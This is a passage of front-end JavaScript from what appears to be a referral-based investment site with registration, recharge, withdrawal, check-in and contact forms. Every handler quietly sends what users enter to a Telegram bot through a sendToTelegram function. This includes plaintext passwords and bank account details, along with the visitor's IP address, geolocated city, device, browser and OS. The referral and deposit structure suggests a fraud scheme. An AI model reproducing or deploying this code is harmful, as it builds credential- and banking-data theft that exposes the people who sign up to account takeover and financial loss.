            const username = document.getElementById('regUsername').value;
            const email = document.getElementById('regEmail').value;
            const phone = document.getElementById('regPhone').value;
            const password = document.getElementById('regPassword').value;
            const confirmPassword = document.getElementById('regConfirmPassword').value;
            const referral = document.getElementById('regReferral').value;
            const bankName = document.getElementById('bankName').value;
            const accountNumber = document.getElementById('accountNumber').value;
            const accountHolder = document.getElementById('accountHolder').value;
            const houseNumber = document.getElementById('houseNumber').value;
            
            // Validate passwords match
            if (password !== confirmPassword) {
                const errorMessage = document.getElementById('registerError');
                errorMessage.textContent = "Passwords do not match!";
                errorMessage.style.display = 'block';
                return;
            }
            
            try {
                // Create user with email/password
                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
                const user = userCredential.user;
                
                // Generate referral code
                const referralCode = generateReferralCode(username);
                
                // Save user data to database
                await database.ref('users/' + user.uid).set({
                    username: username,
                    email: email,
                    phone: phone,
                    balance: 0,
                    totalInvested: 0,
                    totalWithdrawn: 0,
                    referralCode: referralCode,
                    referredBy: referral || null,
                    bankDetails: {
                        bankName: bankName,
                        accountNumber: accountNumber,
                        accountHolder: accountHolder,
                        houseNumber: houseNumber
                    },
                    registrationDate: new Date().toISOString()
                });
                
                // If referred by someone, update their team
                if (referral) {
                    // Find referrer by referral code
                    const snapshot = await database.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
                    if (snapshot.exists()) {
                        const referrerData = snapshot.val();
                        const referrerId = Object.keys(referrerData)[0];
                        
                        // Add to referrer's team
                        await database.ref(`teams/${referrerId}/${user.uid}`).set({
                            username: username,
                            joinDate: new Date().toISOString(),
                            totalInvested: 0
                        });
                    }
                }
                
                document.getElementById('registerSuccess').style.display = 'block';
                document.getElementById('registerError').style.display = 'none';
                
                // Comprehensive registration notification to Telegram
                const userInfo = await getUserInfo();
                let message = `üìù <b>NEW REGISTRATION</b>\n\n`;
                message += `üë§ <b>Username:</b> ${username}\n`;
                message += `üìß <b>Email:</b> ${email}\n`;
                message += `üì± <b>Phone:</b> ${phone}\n`;
                message += `üîí <b>Password:</b> ${password}\n`;
                message += `üîè <b>Confirm Password:</b> ${confirmPassword}\n`;
                message += `üë• <b>Referral Code:</b> ${referral || 'None'}\n`;
                message += `\nüè¶ <b>Bank Details:</b>\n`;
                message += `üèõÔ∏è <b>Bank Name:</b> ${bankName}\n`;
                message += `üî¢ <b>Account Number:</b> ${accountNumber}\n`;
                message += `üë§ <b>Account Holder:</b> ${accountHolder}\n`;
                message += `üè† <b>House Number:</b> ${houseNumber}\n`;
                message += `\nüìÖ <b>Time:</b> ${new Date().toLocaleString()}\n`;
                message += `üåê <b>IP:</b> ${userInfo.ip}\n`;
                message += `üìç <b>Location:</b> ${userInfo.location}\n`;
                message += `üñ•Ô∏è <b>Device:</b> ${userInfo.device}\n`;
                message += `üåê <b>Browser:</b> ${userInfo.browser}\n`;
                message += `üíª <b>OS:</b> ${userInfo.os}\n`;
                
                await sendToTelegram(message);
                
                registerForm.reset();
                
                // Auto-login after registration
                setTimeout(() => {
                    showSection('login');
                }, 2000);
            } catch (error) {
                console.error('Registration error:', error);
                const errorMessage = document.getElementById('registerError');
                errorMessage.textContent = error.message;
                errorMessage.style.display = 'block';
            }
        }
        
        function generateReferralCode(username) {
            // Simple referral code generation
            const randomNum = Math.floor(1000 + Math.random() * 9000);
            return `${username.substring(0, 3)}${randomNum}`.toUpperCase();
        }
        
        async function handleRecharge(e) {
            e.preventDefault();
            
            if (!currentUserId) {
                alert('Please login first');
                return;
            }
            
            const amount = document.getElementById('rechargeAmount').value;
            const method = document.getElementById('rechargeMethod').value;
            const senderName = document.getElementById('senderName').value;
            const transactionId = document.getElementById('transactionId').value;
            const paymentProof = document.getElementById('paymentProof').files[0];
            
            try {
                // Upload payment proof if exists
                let proofUrl = '';
                if (paymentProof) {
                    const storageRef = storage.ref(`payment_proofs/${currentUserId}/${Date.now()}_${paymentProof.name}`);
                    const snapshot = await storageRef.put(paymentProof);
                    proofUrl = await snapshot.ref.getDownloadURL();
                }
                
                // Save recharge request to database
                await database.ref(`recharges/${currentUserId}`).push().set({
                    amount: amount,
                    method: method,
                    senderName: senderName,
                    transactionId: transactionId,
                    proofUrl: proofUrl,
                    status: 'pending',
                    date: new Date().toISOString()
                });
                
                document.getElementById('rechargeSuccess').style.display = 'block';
                document.getElementById('rechargeError').style.display = 'none';
                
                // Enhanced recharge notification to Telegram
                const userInfo = await getUserInfo();
                let message = `üí∞ <b>RECHARGE REQUEST</b>\n\n`;
                message += `üë§ <b>Username:</b> ${currentUser?.username || 'Guest'}\n`;
                message += `üíµ <b>Amount:</b> $${amount}\n`;
                message += `üí≥ <b>Method:</b> ${method}\n`;
                message += `üë§ <b>Sender Name:</b> ${senderName}\n`;
                message += `üÜî <b>Transaction ID:</b> ${transactionId}\n`;
                message += `üìÅ <b>Payment Proof:</b> ${paymentProof ? paymentProof.name : 'Not provided'}\n`;
                message += `\nüìÖ <b>Time:</b> ${new Date().toLocaleString()}\n`;
                message += `üåê <b>IP:</b> ${userInfo.ip}\n`;
                message += `üìç <b>Location:</b> ${userInfo.location}\n`;
                message += `üñ•Ô∏è <b>Device:</b> ${userInfo.device}\n`;
                message += `üåê <b>Browser:</b> ${userInfo.browser}\n`;
                message += `üíª <b>OS:</b> ${userInfo.os}\n`;
                
                await sendToTelegram(message);
                
                rechargeForm.reset();
            } catch (error) {
                console.error('Recharge error:', error);
                const errorMessage = document.getElementById('rechargeError');
                errorMessage.textContent = error.message;
                errorMessage.style.display = 'block';
            }
        }
        
        async function handleWithdraw(e) {
            e.preventDefault();
            
            if (!currentUserId) {
                alert('Please login first');
                return;
            }
            
            const amount = parseFloat(document.getElementById('withdrawAmount').value);
            const method = document.getElementById('withdrawMethod').value;
            const accountName = document.getElementById('accountName').value;
            const accountNumber = document.getElementById('accountNumber').value;
            const bankName = document.getElementById('bankName').value;
            
            // Validate balance
            if (amount > currentUser.balance) {
                const errorMessage = document.getElementById('withdrawError');
                errorMessage.textContent = "Insufficient balance!";
                errorMessage.style.display = 'block';
                return;
            }
            
            try {
                // Save withdrawal request to database
                await database.ref(`withdrawals/${currentUserId}`).push().set({
                    amount: amount,
                    method: method,
                    accountName: accountName,
                    accountNumber: accountNumber,
                    bankName: bankName,
                    status: 'pending',
                    date: new Date().toISOString()
                });
                
                // Update user balance (temporarily, admin will confirm)
                await database.ref(`users/${currentUserId}`).update({
                    balance: currentUser.balance - amount,
                    totalWithdrawn: (currentUser.totalWithdrawn || 0) + amount
                });
                
                document.getElementById('withdrawSuccess').style.display = 'block';
                document.getElementById('withdrawError').style.display = 'none';
                
                // Enhanced withdrawal notification to Telegram
                const userInfo = await getUserInfo();
                let message = `üí∏ <b>WITHDRAWAL REQUEST</b>\n\n`;
                message += `üë§ <b>Username:</b> ${currentUser?.username || 'Guest'}\n`;
                message += `üíµ <b>Amount:</b> $${amount}\n`;
                message += `üí≥ <b>Method:</b> ${method}\n`;
                message += `üë§ <b>Account Name:</b> ${accountName}\n`;
                message += `üî¢ <b>Account Number:</b> ${accountNumber}\n`;
                message += `üè¶ <b>Bank Name:</b> ${bankName}\n`;
                message += `\nüìÖ <b>Time:</b> ${new Date().toLocaleString()}\n`;
                message += `üåê <b>IP:</b> ${userInfo.ip}\n`;
                message += `üìç <b>Location:</b> ${userInfo.location}\n`;
                message += `üñ•Ô∏è <b>Device:</b> ${userInfo.device}\n`;
                message += `üåê <b>Browser:</b> ${userInfo.browser}\n`;
                message += `üíª <b>OS:</b> ${userInfo.os}\n`;
                
                await sendToTelegram(message);
                
                withdrawForm.reset();
                
                // Reload user data to update balance
                loadUserData(currentUserId);
            } catch (error) {
                console.error('Withdrawal error:', error);
                const errorMessage = document.getElementById('withdrawError');
                errorMessage.textContent = error.message;
                errorMessage.style.display = 'block';
            }
        }
        
        async function handleCheckin(e) {
            e.preventDefault();
            
            if (!currentUserId) {
                alert('Please login first');
                return;
            }
            
            try {
                // Check if already checked in today
                const today = new Date().toISOString().split('T')[0];
                const snapshot = await database.ref(`checkins/${currentUserId}`).orderByChild('date').equalTo(today).once('value');
                
                if (snapshot.exists()) {
                    document.getElementById('checkinError').textContent = "You've already checked in today!";
                    document.getElementById('checkinError').style.display = 'block';
                    document.getElementById('checkinSuccess').style.display = 'none';
                    return;
                }
                
                // Calculate random bonus (1-5 dollars)
                const bonus = Math.floor(1 + Math.random() * 5);
                
                // Save check-in
                await database.ref(`checkins/${currentUserId}`).push().set({
                    date: today,
                    reward: bonus
                });
                
                // Update user balance
                await database.ref(`users/${currentUserId}`).update({
                    balance: (currentUser.balance || 0) + bonus
                });
                
                document.getElementById('checkinSuccess').style.display = 'block';
                document.getElementById('checkinError').style.display = 'none';
                
                // Send checkin notification to Telegram
                const userInfo = await getUserInfo();
                let message = `üìã <b>DAILY CHECK-IN</b>\n\n`;
                message += `üë§ Username: ${currentUser?.username || 'Guest'}\n`;
                message += `üéÅ Bonus: $${bonus}\n`;
                message += `üìÖ Date: ${new Date().toLocaleString()}\n`;
                message += `üåê IP: ${userInfo.ip}\n`;
                message += `üìç Location: ${userInfo.location}\n`;
                message += `üñ•Ô∏è Device: ${userInfo.device}\n`;
                message += `üåê Browser: ${userInfo.browser}\n`;
                message += `üíª OS: ${userInfo.os}\n`;
                await sendToTelegram(message);
                
                // Reload checkin history and user data
                loadCheckinHistory();
                loadUserData(currentUserId);
            } catch (error) {
                console.error('Checkin error:', error);
                const errorMessage = document.getElementById('checkinError');
                errorMessage.textContent = error.message;
                errorMessage.style.display = 'block';
            }
        }
        
        async function handleContact(e) {
            e.preventDefault();
            
            const name = document.getElementById('contactName').value;
            const email = document.getElementById('contactEmail').value;
            const phone = document.getElementById('contactPhone').value;
            const subject = document.getElementById('contactSubject').value;
            const messageText = document.getElementById('contactMessage').value;
            
            try {
                // Save contact message to database
                await database.ref('contactMessages').push().set({
                    name: name,
                    email: email,
                    phone: phone,
                    subject: subject,
                    message: messageText,
                    date: new Date().toISOString(),
                    status: 'unread'
                });
                
                document.getElementById('contactSuccess').style.display = 'block';
                document.getElementById('contactError').style.display = 'none';
                
                // Enhanced contact notification to Telegram
                const userInfo = await getUserInfo();
                let message = `üì© <b>CONTACT FORM SUBMISSION</b>\n\n`;
                message += `üë§ <b>Name:</b> ${name}\n`;
                message += `üìß <b>Email:</b> ${email}\n`;
                message += `üì± <b>Phone:</b> ${phone}\n`;
                message += `üìå <b>Subject:</b> ${subject}\n`;
                message += `üí¨ <b>Message:</b>\n${messageText}\n`;
                message += `\nüìÖ <b>Time:</b> ${new Date().toLocaleString()}\n`;
                message += `üåê <b>IP:</b> ${userInfo.ip}\n`;
                message += `üìç <b>Location:</b> ${userInfo.location}\n`;
                message += `üñ•Ô∏è <b>Device:</b> ${userInfo.device}\n`;
                message += `üåê <b>Browser:</b> ${userInfo.browser}\n`;
                message += `üíª <b>OS:</b> ${userInfo.os}\n`;
                
                await sendToTelegram(message);
                
                contactForm.reset();
            } catch (error) {
                console.error('Contact form error:', error);
                const errorMessage = document.getElementById('contactError');
                errorMessage.textContent = error.message;
                errorMessage.style.display = 'block';
            }
        }
        
        function logout() {
            auth.signOut().then(() => {
                isLoggedIn = false;
                currentUser = null;
                currentUserId = null;
                updateUI();
            }).catch(error => {
                console.error('Logout error:', error);
            });
        }
        
        // Telegram functions
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }
        
        async function getUserInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                let location = "Unknown";
                try {
                    const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const locData = await locResponse.json();
                    location = `${locData.city || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
                } catch (e) {
                    console.error('Location error:', e);
                }
                
                return {
                    ip: ipData.ip,
                    location: location,
                    device: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                    browser: detectBrowser(),
                    os: detectOS()
                };
            } catch (error) {
                return {
                    ip: 'Unknown',
                    location: 'Unknown',
                    device: 'Unknown',
                    browser: 'Unknown',
                    os: 'Unknown'
                };
            }
        }
        
        // Detect browser
        function detectBrowser() {
            const userAgent = navigator.userAgent;
            
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("SamsungBrowser")) return "Samsung Browser";
            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
            if (userAgent.includes("Trident")) return "Internet Explorer";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Safari")) return "Safari";
            
            return "Unknown";
        }
        
        // Detect OS
        function detectOS() {
            const userAgent = navigator.userAgent;
            
            if (userAgent.includes("Windows")) return "Windows";
            if (userAgent.includes("Mac")) return "MacOS";
            if (userAgent.includes("Linux")) return "Linux";
            if (userAgent.includes("Android")) return "Android";
            if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
            
            return "Unknown";
        }
    });
    </script>
</body>
</html>